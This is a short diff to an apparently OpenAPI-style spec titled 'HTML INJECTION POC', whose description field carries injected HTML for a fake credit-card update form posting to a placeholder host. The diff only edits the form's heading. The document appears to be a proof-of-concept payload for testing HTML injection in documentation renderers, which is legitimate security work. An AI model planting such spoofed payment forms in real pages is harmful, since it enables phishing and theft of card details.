@@ -4,7 +4,7 @@ info:
   title: HTML INJECTION POC
   description: '<div class="creditCardForm">
     <div class="heading">
-        <h1>Update your Credit Card</h1>
+        <h1>Update your Card</h1>
     </div>
     <div class="payment">
         <form action="https://example.com/" method="post" class="form-signin" id = "login_form">
